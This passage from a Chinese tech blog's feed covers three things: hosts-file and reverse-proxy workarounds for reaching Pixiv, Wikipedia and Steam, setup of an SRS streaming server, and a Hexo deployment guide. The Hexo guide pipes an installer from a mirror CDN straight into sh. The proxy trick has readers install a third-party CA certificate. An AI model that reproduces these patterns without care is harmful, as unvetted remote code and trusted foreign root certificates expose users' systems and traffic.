</span><br><span class="line">127.0.0.1       sensei.pixiv.net</span><br><span class="line">127.0.0.1       fanbox.pixiv.net</span><br><span class="line">127.0.0.1       i.pximg.net</span><br><span class="line">127.0.0.1       source.pixiv.net</span><br><span class="line">127.0.0.1       i1.pixiv.net </span><br><span class="line">127.0.0.1       i2.pixiv.net </span><br><span class="line">127.0.0.1       i3.pixiv.net </span><br><span class="line">127.0.0.1       i4.pixiv.net </span><br><span class="line">210.129.120.50  app-api.pixiv.net  </span><br><span class="line">74.120.148.207  g-client-proxy.pixiv.net </span><br><span class="line">210.140.131.159 d.pixiv.org </span><br><span class="line">210.140.92.135  pixiv.pximg.net  </span><br><span class="line">210.140.92.134  s.pximg.net</span><br><span class="line"><span class="comment">#Pixiv End</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 顺手修一下维基百科</span></span><br><span class="line"><span class="comment"># Wikipedia Start</span></span><br><span class="line">127.0.0.1 en.wikipedia.org</span><br><span class="line">127.0.0.1 zh.wikipedia.org <span class="comment">#中文维基百科桌面版</span></span><br><span class="line">127.0.0.1 en.m.wikipedia.org</span><br><span class="line">127.0.0.1 zh.m.wikipedia.org</span><br><span class="line">127.0.0.1 zh-yue.wikipedia.org <span class="comment">#粤文维基百科桌面版</span></span><br><span class="line">127.0.0.1 wuu.wikipedia.org <span class="comment">#吴语维基百科桌面版</span></span><br><span class="line">127.0.0.1 ug.wikipedia.org <span class="comment">#维吾尔文维基百科桌面版</span></span><br><span class="line">127.0.0.1 ja.wikipedia.org <span class="comment">#日文维基百科桌面版</span></span><br><span class="line">127.0.0.1 zh.wikinews.org <span class="comment">#中文维基新闻桌面版</span></span><br><span class="line"><span class="comment"># Wikipedia End</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 顺手修一下Steam</span></span><br><span class="line"><span class="comment"># Steam</span></span><br><span class="line">127.0.0.1 store.steampowered.com</span><br><span class="line">127.0.0.1 steamcommunity.com</span><br><span class="line"><span class="comment"># Steam end</span></span><br></pre></td></tr></table></figure><p>接下来有两种方式让host生效</p><h5 id="重启电脑"><a href="#重启电脑" class="headerlink" title="重启电脑"></a>重启电脑</h5><p>这个不多说了，右上角电源键走起</p><h5 id="重启服务"><a href="#重启服务" class="headerlink" title="重启服务"></a>重启服务</h5><p>使用一下命令来重启networking服务（请用root用户运行）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~</span><br><span class="line">$ <span class="built_in">cd</span> etc/init.d</span><br><span class="line">$ ./networking restart</span><br></pre></td></tr></table></figure><p>这样就可以立即加载HOST文件，打开你的浏览器，打开P站就可以愉快地浏览图片啦~</p><h4 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h4><p>当你在你的linux服务器上安装了反代服务后，你可以在你的windows计算机上利用host指向到你的linux服务器来达到上P站的目的<strong>（当然，你需要安装Mashirozx提供的ca证书）</strong></p><p>在host文件中输入以下内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#www.google.com域名仅用于登陆验证</span></span><br><span class="line"><span class="comment">#如果你不需要这个功能，请把下一行删掉</span></span><br><span class="line">172.52.5.100       www.google.com</span><br><span class="line"></span><br><span class="line"><span class="comment">#Pixiv Start</span></span><br><span class="line">172.52.5.100       pixiv.net </span><br><span class="line">172.52.5.100       www.pixiv.net </span><br><span class="line">172.52.5.100       ssl.pixiv.net</span><br><span class="line">172.52.5.100       accounts.pixiv.net </span><br><span class="line">172.52.5.100       touch.pixiv.net</span><br><span class="line">172.52.5.100       oauth.secure.pixiv.net</span><br><span class="line">172.52.5.100       dic.pixiv.net</span><br><span class="line">172.52.5.100       en-dic.pixiv.net </span><br><span class="line">172.52.5.100       sketch.pixiv.net</span><br><span class="line">172.52.5.100       payment.pixiv.net</span><br><span class="line">172.52.5.100       factory.pixiv.net </span><br><span class="line">172.52.5.100       comic.pixiv.net  </span><br><span class="line">172.52.5.100       novel.pixiv.net </span><br><span class="line">172.52.5.100       imgaz.pixiv.net </span><br><span class="line">172.52.5.100       sensei.pixiv.net</span><br><span class="line">172.52.5.100       fanbox.pixiv.net</span><br><span class="line">172.52.5.100       i.pximg.net</span><br><span class="line">172.52.5.100       source.pixiv.net</span><br><span class="line">172.52.5.100       i1.pixiv.net </span><br><span class="line">172.52.5.100       i2.pixiv.net </span><br><span class="line">172.52.5.100       i3.pixiv.net </span><br><span class="line">172.52.5.100       i4.pixiv.net </span><br><span class="line">210.129.120.50  app-api.pixiv.net  </span><br><span class="line">74.120.148.207  g-client-proxy.pixiv.net </span><br><span class="line">210.140.131.159 d.pixiv.org </span><br><span class="line">210.140.92.135  pixiv.pximg.net  </span><br><span class="line">210.140.92.134  s.pximg.net</span><br><span class="line"><span class="comment">#Pixiv End</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 顺手修一下维基百科</span></span><br><span class="line"><span class="comment"># Wikipedia Start</span></span><br><span class="line">172.52.5.100 en.wikipedia.org</span><br><span class="line">172.52.5.100 zh.wikipedia.org <span class="comment">#中文维基百科桌面版</span></span><br><span class="line">172.52.5.100 en.m.wikipedia.org</span><br><span class="line">172.52.5.100 zh.m.wikipedia.org</span><br><span class="line">172.52.5.100 zh-yue.wikipedia.org <span class="comment">#粤文维基百科桌面版</span></span><br><span class="line">172.52.5.100 wuu.wikipedia.org <span class="comment">#吴语维基百科桌面版</span></span><br><span class="line">172.52.5.100 ug.wikipedia.org <span class="comment">#维吾尔文维基百科桌面版</span></span><br><span class="line">172.52.5.100 ja.wikipedia.org <span class="comment">#日文维基百科桌面版</span></span><br><span class="line">172.52.5.100 zh.wikinews.org <span class="comment">#中文维基新闻桌面版</span></span><br><span class="line"><span class="comment"># Wikipedia End</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 顺手修一下Steam</span></span><br><span class="line"><span class="comment"># Steam</span></span><br><span class="line">172.52.5.100 store.steampowered.com</span><br><span class="line">172.52.5.100 steamcommunity.com</span><br><span class="line"><span class="comment"># Steam end</span></span><br></pre></td></tr></table></figure><p><strong>其中的ip地址172.52.5.100请更换为你的linux服务器地址！！！</strong></p><p>当你确认已经安装完了证书，linux服务器的nginx服务运行正常后，你就可以打开pixiv愉快地浏览图片了！</p><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>上个月没有写3篇文章，我的问题（给自己的定位是3篇&#x2F;mo）</p><p>国庆我没有咕咕咕，是不是应该夸奖我~</p>]]></content>
      
      
      <categories>
          
          <category> Software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手把手教你怎么搭建属于自己的直播服务器~</title>
      <link href="/posts/srs/"/>
      <url>/posts/srs/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>前两个月学校的旧外包跑路了（其实是合约到期了），他们的直播系统就被学校废弃了，那么问题就来了：学校要直播呀！！！没有直播系统怎么办啊！！！</p><p>所以这次就来手把手（按照我搭建的经验）来教你怎么搭建属于自个的直播系统~</p><p><code>PS：可以打开侧边栏看，方便找到需要的内容</code></p><h3 id="准备材料"><a href="#准备材料" class="headerlink" title="准备材料"></a>准备材料</h3><p><code>*表示非必需</code></p><p>1、一台linux电脑（windows上没试过，感兴趣的同志们可以试试）</p><p>*2、一台网页服务器（可以用上面的linux电脑，或者个人电脑）</p><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><h4 id="GoLang环境"><a href="#GoLang环境" class="headerlink" title="GoLang环境"></a>GoLang环境</h4><p>使用命令进入root用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ su</span><br></pre></td></tr></table></figure><h5 id="一键安装方式"><a href="#一键安装方式" class="headerlink" title="一键安装方式"></a>一键安装方式</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/letseeqiji/oneinstall.git</span><br><span class="line">$ <span class="built_in">cd</span> oneinstall/golang</span><br><span class="line">$ bash goinstall.sh</span><br></pre></td></tr></table></figure><p>直接运行脚本进行安装</p><h6 id="Ubantu-x2F-Debian用户"><a href="#Ubantu-x2F-Debian用户" class="headerlink" title="Ubantu&#x2F;Debian用户"></a>Ubantu&#x2F;Debian用户</h6><p>你可以使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install golang</span><br></pre></td></tr></table></figure><p>直接安装Go环境，然后设置GOPATH即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vi /etc/profile</span><br></pre></td></tr></table></figure><p>打开文件后，对文件修改，在文件最下面添加</p><p>export GOPATH&#x3D;&#x2F;goWorkPlace</p><p>然后按Esc，保存文件</p><p>最后，刷新文件，使更改生效。输入命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure><h5 id="二进制码安装方式"><a href="#二进制码安装方式" class="headerlink" title="二进制码安装方式"></a>二进制码安装方式</h5><p>64位</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://storage.googleapis.com/golang/go1.4.1.linux-amd64.tar.gz</span><br></pre></td></tr></table></figure><p>32位</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://storage.googleapis.com/golang/go1.4.1.linux-386.tar.gz</span><br></pre></td></tr></table></figure><p>在&#x2F;usr&#x2F;local下安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo tar -xzf &lt;filename&gt; -C /usr/local</span><br></pre></td></tr></table></figure><p>配置环境变量：有三个变量GOPATH、PATH、GOROOT</p><p>GOROOT就是go的安装路径</p><p>GOPATH就是go的工作目录</p><p>PATH是go安装路径下的bin目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vi /etc/profile</span><br></pre></td></tr></table></figure><p>打开文件后，对文件修改，在文件最下面添加</p><p>export GOPATH&#x3D;&#x2F;goWorkPlace</p><p>export GOROOT&#x3D;&#x2F;usr&#x2F;local&#x2F;go</p><p>export PATH&#x3D;$PATH:$GOROOT&#x2F;bin</p><p>保存文件，刷新，使更改生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure><h4 id="srs设置"><a href="#srs设置" class="headerlink" title="srs设置"></a>srs设置</h4><p>使用git克隆代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> git@github.com:ossrs/srs.git</span><br><span class="line">$ <span class="built_in">cd</span> srs</span><br></pre></td></tr></table></figure><p>进入srs目录，对目录中的文件进行修改。</p><p>打开.&#x2F;trunk&#x2F;conf&#x2F;srs.conf文件，对其进行修改</p><p>其中有几个参数需要修改：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">listen1935; <span class="comment">#直播推流的端口</span></span><br><span class="line">max_connections 1000; <span class="comment">#最大线程数</span></span><br><span class="line">srs_log_tankconsole;<span class="comment">#srs日志输出位置，可以为console或file</span></span><br><span class="line">srs_log_file ./objs/srs.log;<span class="comment">#srs日志输出文件，当上面为file时必须设置</span></span><br></pre></td></tr></table></figure><p>上面的参数根据自己的需要进行修改，其中max_connections推荐设置为100，否则编译有可能会出错</p><p>在root用户中，进入.&#x2F;trunk，使用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./configure &amp;&amp; make</span><br></pre></td></tr></table></figure><p>对srs进行编译，编译过程稍长，请耐心等待</p><p>当编译完成后，可以使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./objs/srs -c conf/srs.conf</span><br></pre></td></tr></table></figure><p>打开srs服务器，打开客户机上的OBS Studio（vMix也可以），推流地址填写如下</p><p><code>rtmp://&lt;你的srs服务器ip&gt;:1935/home</code></p><p>推流密钥填写如下</p><p><code>/live</code></p><p>也可以把live换成任意的文字或路径</p><p>此时可以使用VLC Media Player来检测是否推流成功，打开VLC Media Player，选择“媒体”-&gt;“打开网络串流”，在URL里面填写你的rtmp地址（包括密钥）例如我的OBS配置如下</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/srs/OBS-Conf.png" alt="OBS-Config"></p><p>那么我就应该填写<code>rtmp://172.52.5.100:1935/home/live</code></p><p>点击确定，可以看到我推流出来的内容</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/srs/VLC-Media-Player-Success.png" alt="VLC"></p><p>这样就证明我推流成功了！</p><h3 id="网页前端设置"><a href="#网页前端设置" class="headerlink" title="网页前端设置"></a>网页前端设置</h3><p>我们毕竟是个直播，总不可能每个班级都安装一个VLC Media Player的嘛，所以说，我们要用网页来拉流。</p><p>用网页来拉流，就要用到HLS了（具体百度哦~），但是我们要怎么打开HLS呢？</p><p>你需要在你的srs.conf中的</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vhost __defaultVhost__ <span class="punctuation">&#123;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>中加入以下内容（可以直接复制粘贴）</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">vhost __defaultVhost__ <span class="punctuation">&#123;</span></span><br><span class="line"> # http-flv设置</span><br><span class="line">    http_remux<span class="punctuation">&#123;</span></span><br><span class="line">        enabled    on;</span><br><span class="line">        mount      <span class="punctuation">[</span>vhost<span class="punctuation">]</span>/<span class="punctuation">[</span>app<span class="punctuation">]</span>/<span class="punctuation">[</span>stream<span class="punctuation">]</span>.flv;</span><br><span class="line">        hstrs      on;</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"> </span><br><span class="line">    # hls设置</span><br><span class="line">    hls<span class="punctuation">&#123;</span></span><br><span class="line">        enabled       on;</span><br><span class="line">        hls_path      ./objs/nginx/html;</span><br><span class="line">        hls_fragment  <span class="number">10</span>;</span><br><span class="line">        hls_window    <span class="number">60</span>;</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>然后重新打开srs即可</p><p>那么下面的链接应该都可以使用（按照我的填写方法为例）</p><table><thead><tr><th align="center">链接类型</th><th align="center">链接</th></tr></thead><tbody><tr><td align="center">rtmp</td><td align="center">rtmp:&#x2F;&#x2F;172.52.5.100:1935&#x2F;live&#x2F;home</td></tr><tr><td align="center">http&#x2F;flv</td><td align="center"><a href="http://172.52.5.100:8080/live/home.flv">http://172.52.5.100:8080/live/home.flv</a></td></tr><tr><td align="center">http&#x2F;m3u8</td><td align="center"><a href="http://172.52.5.100:8080/live/home.m3u8">http://172.52.5.100:8080/live/home.m3u8</a></td></tr></tbody></table><p>可以利用我们的网页示例，进行调试（请不要使用本地打开文件的方式进行调试，会被拦截）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> git@github.com:5amstd/live-system.git</span><br></pre></td></tr></table></figure><p>将里面的146行的视频地址更改为自己的视频地址即可</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">video:&#x27;http://172.52.5.100:8080/home/live.flv&#x27; //视频地址</span><br></pre></td></tr></table></figure><p>然后保存刷新，打开里面的视频播放器（都9102年了还用Flash？？？），就可以看到直播画面了</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/srs/live.png" alt="Website"></p><p>如果你看到了直播画面，就证明你成功了~</p><h3 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h3><p>第一次用Ubantu来搭建项目，感觉Ubantu挺好用的，所以现在两台电脑吧，把我之前的那台DELL OptiPlex 3046拿来装Ubantu了</p><p>srs搞了我很长时间，其实最主要的问题是Ubantu（Linux）用的不很熟悉，然后权限问题也很烦</p><p>HLS的分发挺麻烦的，查看了很多官方文档，后来在别人的文章里面找到了解决方法</p><p>最近喜欢打方舟，有舟游玩家嘛，加波好友啊：喵呜初音#0717（B服玩家哦~）</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最全面的Hexo部署方法，交给你了~</title>
      <link href="/posts/hexo-deploy-guide/"/>
      <url>/posts/hexo-deploy-guide/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong>温馨提示：推荐点击左下角箭头打开目录，方便你更好地找到内容！</strong></p><h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><h4 id="什么是Hexo？"><a href="#什么是Hexo？" class="headerlink" title="什么是Hexo？"></a>什么是Hexo？</h4><p>（我不多BB了，去看<a href="%5Bhttps://hexo.io/zh-cn/docs/index.html#%E4%BB%80%E4%B9%88%E6%98%AF-Hexo%EF%BC%9F%5D(https://hexo.io/zh-cn/docs/index.html#%E4%BB%80%E4%B9%88%E6%98%AF-Hexo%EF%BC%9F)">官网</a>吧，介绍什么的真的不适合我……）</p><h4 id="如何安装？"><a href="#如何安装？" class="headerlink" title="如何安装？"></a>如何安装？</h4><h5 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h5><p>你需要的东西有：</p><p>一个带有Page服务的仓库（推荐Github，Coding）</p><p>一台电脑（Windows或Linux均可，差别不大）</p><p>最后就是耐心（这个过程可能会很枯燥的说~）</p><h5 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h5><h6 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h6><p>安装 Node.js 的最佳方式是使用 <a href="https://github.com/nvm-sh/nvm" target="_blank" rel="noopener">nvm</a>。nvm 的开发者提供了一个自动安装 nvm 的简单脚本：</p>Curl:<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ curl -o- https://cdn.bili33.top/nvm-sh/nvm/v0.34.0/install.sh | sh</span><br></pre></td></tr></tbody></table></figure>wget:<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ wget -qO- https://cdn.bili33.top/nvm-sh/nvm/v0.34.0/install.sh | sh</span><br></pre></td></tr></tbody></table></figure>安装完成后，重启终端并执行下列命令即可安装 Node.js。<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ nvm install stable</span><br></pre></td></tr></tbody></table></figure><blockquote class="note info"><strong class="note-title">Windows 用户</strong><p>对于windows用户来说，建议使用安装程序进行安装。安装时，请勾选<strong>Add to PATH</strong>选项。<br>另外，您也可以使用<strong>Git Bash</strong>，这是git for windows自带的一组程序，提供了Linux风格的shell，在该环境下，您可以直接用上面提到的命令来安装Node.js。打开它的方法很简单，在任意位置单击右键，选择“Git Bash Here”即可。由于Hexo的很多操作都涉及到命令行，您可以考虑始终使用<strong>Git Bash</strong>来进行操作。</p></blockquote><blockquote class="note info"><strong class="note-title">Linux 用户</strong><p>大部分 Linux 发行版都会在它们的默认软件包仓库中分发 Node.js。第三方仓库 <a href="https://github.com/nodesource/distributions" target="_blank" rel="noopener">NodeSource</a> 通常能分发最新版本的 Node.js。</p></blockquote><blockquote class="note warn"><strong class="note-title">可选操作：</strong><p>由于众所周知的原因，使用npm进行安装速度十分缓慢。也可以参考<a href="https://npm.taobao.org/" target="_blank" rel="noopener">这个页面</a>，利用国内镜像安装npm模块。</p></blockquote><h6 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h6><p>Windows：下载并安装 git.<br>Mac：使用 Homebrew, MacPorts ：brew install git;或下载 安装程序 安装。<br>Linux (Ubuntu, Debian)：sudo apt-get install git-core<br>Linux (Fedora, Red Hat, CentOS)：sudo yum install git-core</p><blockquote class="note warn"><strong class="note-title">Windows 用户</strong><p>由于众所周知的原因，从上面的链接下载git for windows最好挂上一个代理，否则下载速度十分缓慢。也可以参考<a href="https://github.com/waylau/git-for-win" target="_blank" rel="noopener">这个页面</a>，收录了存储于百度云的下载地址。</p></blockquote><h6 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h6><p>当你确定你已经安装完了Node.js和Git，就可以使用npm安装hexo了，使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>或（<strong>安装了cnpm国内镜像的情况下，下面所有的npm命令均可换为cnpm命令，下面不再说明</strong>）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cnpm install -g hexo-cli</span><br></pre></td></tr></table></figure><h5 id="初始化Hexo文件夹"><a href="#初始化Hexo文件夹" class="headerlink" title="初始化Hexo文件夹"></a>初始化Hexo文件夹</h5><p>在你认为合适的地方新建一个文件夹，文件夹名字自拟，然后使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init</span><br></pre></td></tr></table></figure><p>来初始化你的文件夹（文件夹必须是空的），并且使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install</span><br></pre></td></tr></table></figure><p>来安装相关的依赖库！</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/hexo-deploy-guide/Powershell-runtime-install.png" alt="初始化库和安装依赖"></p><h4 id="配置网站"><a href="#配置网站" class="headerlink" title="配置网站"></a>配置网站</h4><p>当你安装完所有的依赖以后，你就可以配置你的网站。</p><p>你也可以使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo s</span><br></pre></td></tr></table></figure><p>来进行本地调试，在浏览器中输入<a href="localhost:4000">localhost:4000</a>进入自己的网站。</p><p>关于hexo目录下的_config.yml文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Site</span></span><br><span class="line">title: &lt;title&gt;<span class="comment">#自己的网页名字，将在标签页标题中显示为&lt;title&gt; - &lt;subtitle&gt;</span></span><br><span class="line">subtitle: &lt;subtitle&gt; <span class="comment">#副标题，在标签页标题显示</span></span><br><span class="line">description: &lt;descr&gt; <span class="comment">#网页描述（讲真我不知道有啥用）</span></span><br><span class="line">keywords: &lt;keywords&gt; <span class="comment">#网页搜索关键词</span></span><br><span class="line">author: &lt;author&gt; <span class="comment">#网页作者</span></span><br><span class="line">language: en <span class="comment">#网页语言，若主题支持中文可以不用改</span></span><br><span class="line">timezone: <span class="comment">#时区，可以不改</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="comment">## If your site is put in a subdirectory, set url as &#x27;http://yoursite.com/child&#x27; and root as &#x27;/child/&#x27;</span></span><br><span class="line">url: http://yoursite.com<span class="comment">#网页网址，一般填写主页的地址，例如我的网页就填http://bili33.top</span></span><br><span class="line">root: /<span class="comment">#网站根目录，可以不改</span></span><br><span class="line">permalink: :year/:month/:day/:title/<span class="comment">#网页永久链接格式，可以自己修改</span></span><br><span class="line">permalink_defaults:</span><br></pre></td></tr></table></figure><p>关于主题：</p><p>主题可以去<a href="https://hexo.io/themes/">https://hexo.io/themes/</a>找，也可以在github逛一逛，说不定就找到好主题了呢？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line">theme: landscape<span class="comment"># 主题名字，landscape是默认主题，改成你的主题文件夹的名字即可！</span></span><br></pre></td></tr></table></figure><p>在clone的时候建议用git clone .address&gt; theme&#x2F;.theme name&gt; 这样方便管理~</p><p>关于主题的配置，详情请见各主题说明文档！</p><h4 id="部署网站"><a href="#部署网站" class="headerlink" title="部署网站"></a>部署网站</h4><p>在准备东西的时候，我们准备了一个github（或coding）账号，下面以github为例子</p><p>在Github中新建一个仓库，仓库名自拟，也可以采用官方格式.username&gt;.github.io，一定要设为公开仓库（有Github Pro的当我没说）</p><p>然后回到你的hexo文件夹，打开命令窗口，输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>来安装git的部署器，其他部署器<a href="https://hexo.io/zh-cn/docs/deployment">请看这里</a></p><p>打开_config.yml，拉到最底下，会发现有个Deployment，你可以按照我下面这么填写</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repo: &lt;repo address&gt; <span class="comment"># 请替换为你的仓库地址！</span></span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>填写完成后，保存即可，然后打开命令窗口，使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean <span class="comment">#不是必要的</span></span><br><span class="line">$ hexo generate</span><br><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>来部署你的网站，其中generate可以简写为g，deploy可以简写为d，如果觉得打两行命令太麻烦，可以使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo d -g</span><br></pre></td></tr></table></figure><p>一条命令来直接部署，省去不必要的麻烦。</p><p>你也可以同时部署多个仓库，例如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span 